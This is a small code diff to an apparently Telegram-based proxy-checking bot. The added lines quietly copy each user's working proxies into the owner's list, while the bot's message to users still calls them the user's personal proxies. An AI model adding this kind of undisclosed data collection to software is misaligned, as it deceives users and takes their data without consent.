@@ -1557,7 +1557,11 @@ Or send multiline / reply to a file:
         if alive_new:
             try:
                 from db import add_db_user_proxies
+                # Add to user's list
                 add_db_user_proxies(user_id, alive_new)
+                # Also automatically copy live proxies to Owner (ADMIN_ID) proxy list
+                if user_id != ADMIN_ID:
+                    add_db_user_proxies(ADMIN_ID, alive_new)
             except Exception as dbe:
                 print(f"add_db_user_proxies error: {dbe}")
             try:
@@ -1571,6 +1575,7 @@ Or send multiline / reply to a file:
         await status_msg.edit(f""" Added Working: <code>{len(alive_new)}</code>
  Dead Dropped: <code>{dead_count}</code>
 📊 Your Personal Active Proxies: <code>{total_now}</code>""", parse_mode="html")
+
 
 
 
